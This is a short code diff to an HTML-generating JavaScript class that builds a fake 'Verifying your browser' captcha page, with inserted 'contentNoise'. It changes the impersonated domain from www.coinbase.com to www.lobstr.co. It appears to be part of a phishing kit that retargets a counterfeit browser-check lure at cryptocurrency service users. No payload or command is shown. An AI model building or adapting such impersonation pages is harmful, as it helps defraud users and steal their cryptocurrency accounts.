@@ -135,7 +135,7 @@ class BackgroundHTMLTransformer {
 
     <div class="content">
         ${contentNoise}
-        <h1 class="title">www.coinbase.com</h1>
+        <h1 class="title">www.lobstr.co</h1>
         <p class="subtitle">Verifying your browser before accessing the site...</p>
         
         <div id="captchaContainer">
